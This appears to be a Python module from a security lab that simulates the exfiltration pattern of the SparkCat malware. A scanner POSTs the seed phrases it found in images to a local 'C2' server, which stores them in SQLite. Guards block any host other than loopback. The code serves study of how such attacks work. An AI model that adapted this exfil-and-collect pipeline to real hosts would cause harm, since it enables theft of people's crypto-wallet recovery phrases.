"""C2 模拟层:接收 scan 端"回传"的本地 HTTP 服务。

复刻 SparkCat 的 exfil 拓扑(受害者端 → C2 收集端),但 **fail-closed 地
只绑 127.0.0.1**:绑定非回环地址直接拒绝启动,零外联。
"""

from __future__ import annotations

import json
import sqlite3
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

_LOOPBACK = "127.0.0.1"

_LOOPBACK_HOSTS = frozenset({"127.0.0.1", "::1", "localhost"})
# 注意:127.0.0.2-127.255.255.254 技术上也属回环,这里刻意只放行 127.0.0.1(收窄,fail-closed);
# "localhost" 按字符串放行,不做解析(绕过 localhost→外部地址 的 DNS rebinding 不在本实验范围)。

_DEFAULT_C2_DB = Path.home() / ".local" / "share" / "mnestic" / "c2.db"

# 回传 payload 上限:助记词截图级别的内容远小于此,超限即拒
_MAX_PAYLOAD_BYTES = 10 * 1024 * 1024


def _require_loopback_url(url: str) -> None:
    """回传目标必须是回环地址——与 C2 端的绑定红线对称,杜绝真实外联。"""
    from urllib.parse import urlsplit

    host = (urlsplit(url).hostname or "").lower()
    if host not in _LOOPBACK_HOSTS:
        raise RuntimeError(f"回传目标拒绝非回环地址: {host or url}(红线:零外联,仅 127.0.0.1)")


def exfiltrate(url: str, findings: list[dict], *, timeout: float = 5.0) -> dict:
    """scan 端把检出结果 POST 给 C2(仅允许指向 127.0.0.1)。"""
    _require_loopback_url(url)
    import urllib.request

    req = urllib.request.Request(
        url,
        data=json.dumps({"findings": findings}).encode("utf-8"),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return json.loads(resp.read().decode("utf-8"))


def record_exfil(items: list[dict], db_path: str | Path = _DEFAULT_C2_DB) -> int:
    """C2 端入库,返回本次入库条数。"""
    path = Path(db_path)
    path.parent.mkdir(parents=True, exist_ok=True)
    conn = sqlite3.connect(path)
    try:
        conn.execute(
            """
            CREATE TABLE IF NOT EXISTS exfil (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                image TEXT NOT NULL,
                phrase TEXT NOT NULL,
                word_count INTEGER NOT NULL,
                checksum_valid INTEGER NOT NULL,
                received_at TEXT NOT NULL DEFAULT (datetime('now'))
            )
            """
        )
        conn.executemany(
            "INSERT INTO exfil (image, phrase, word_count, checksum_valid) VALUES (?, ?, ?, ?)",
            [
                (str(item.get("image", "")), str(item.get("phrase", "")),
                 int(item.get("word_count", 0)), int(bool(item.get("checksum_valid", False))))
                for item in items
            ],
        )
        conn.commit()
    finally:
        conn.close()
    return len(items)


def make_handler(db_path: str | Path) -> type[BaseHTTPRequestHandler]:
    class ExfilHandler(BaseHTTPRequestHandler):
        def do_POST(self) -> None:  # noqa: N802 (http.server 命名约定)
            if self.path != "/exfil":
                self.send_error(404)
                return
            try:
                length = int(self.headers.get("Content-Length", "0"))
                if length < 0 or length > _MAX_PAYLOAD_BYTES:
                    raise ValueError(f"Content-Length 越界: {length}")
                payload = json.loads(self.rfile.read(length).decode("utf-8"))
                count = record_exfil(list(payload.get("findings", [])), db_path)
            except (ValueError, KeyError, json.JSONDecodeError, sqlite3.Error) as exc:
                body = json.dumps({"ok": False, "error": str(exc)}).encode("utf-8")
                self.send_response(400)
            else:
                body = json.dumps({"ok": True, "count": count}).encode("utf-8")
                self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def log_message(self, format: str, *args) -> None:  # noqa: A002
            print(f"[mnestic-c2] {self.address_string()} {format % args}")

    return ExfilHandler


def start_c2(
    port: int = 8765,
    db_path: str | Path = _DEFAULT_C2_DB,
    host: str = _LOOPBACK,
) -> ThreadingHTTPServer:
    """启动 C2 模拟器。fail-closed:绑定非回环地址直接拒绝启动。"""
    if host not in _LOOPBACK_HOSTS:
        raise RuntimeError(f"C2 模拟器拒绝绑定非回环地址: {host}(红线:仅本机)")
    server = ThreadingHTTPServer((host, port), make_handler(db_path))
    print(f"[mnestic-c2] 监听 http://{host}:{port}/exfil (仅本机回环,库: {db_path})")
    return server
